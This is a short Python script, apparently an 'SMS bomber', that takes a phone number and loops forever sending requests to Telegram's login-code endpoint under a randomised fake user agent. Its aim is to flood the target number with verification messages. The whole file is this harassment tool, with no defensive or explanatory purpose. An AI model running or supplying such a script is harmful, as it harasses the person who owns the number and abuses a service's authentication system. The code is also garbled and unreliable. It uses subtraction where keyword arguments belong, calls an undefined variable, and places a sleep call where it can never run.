import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')
 

 
while True:
 try:
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
     print('+')
 except:
     print('=')
 try:
     print('+')
     requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={'phone': "+" + number})
 except:
     print('=')
 try:
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
     print('+')
 except:
     print('=')
 try:
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
     print('+')
 except:
     print('=')
     
time.sleep(50)
